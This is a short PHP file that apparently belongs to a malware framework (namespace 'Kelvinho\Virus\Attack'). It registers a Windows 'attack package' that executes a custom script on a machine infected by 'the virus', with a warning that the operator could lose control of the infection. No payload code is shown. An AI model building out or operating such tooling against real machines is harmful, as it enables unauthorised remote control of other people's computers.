<?php

use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.ExecuteScript", "\\Kelvinho\\Virus\\Attack\\AttackPackages\\Windows\\OneTime\\ExecuteScript", "adv.ExecuteScript", "Executes a custom script. This is discouraged, because the whole point of attack packages is to make sure the code runs well. Use this at your own risk as you might lose the virus to uncontrolled behavior.");